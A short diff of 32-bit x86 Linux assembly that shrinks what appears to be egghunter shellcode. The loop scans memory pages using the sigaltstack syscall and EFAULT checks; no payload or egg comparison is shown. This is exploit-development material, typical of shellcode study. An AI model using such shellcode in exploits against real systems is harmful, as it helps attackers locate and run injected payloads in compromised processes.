@@ -7,15 +7,13 @@ global _start
 section .text
 
 _start:
-	cld			; clear direction flag
-	xor edx, edx		; set edx to 0
-	mov ebx, edx		; set ebx to 0
+	xor ebx, ebx		; set ebx to 0
 
 nextpage:			; use pages of 4096 bytes (0x1000)
 	or   bx, 0xfff		; go to next page
 nextbyte:
 	inc  ebx		; go to next byte
-	mov  eax, edx		; clear eax
+	xor  eax, eax		; clear eax
 	mov  al, 0xBA		; syscall number for sys_sigaltstack
 	int  0x80		; syscall
 	cmp  al, 0xf2		; check whether syscall return EFAULT
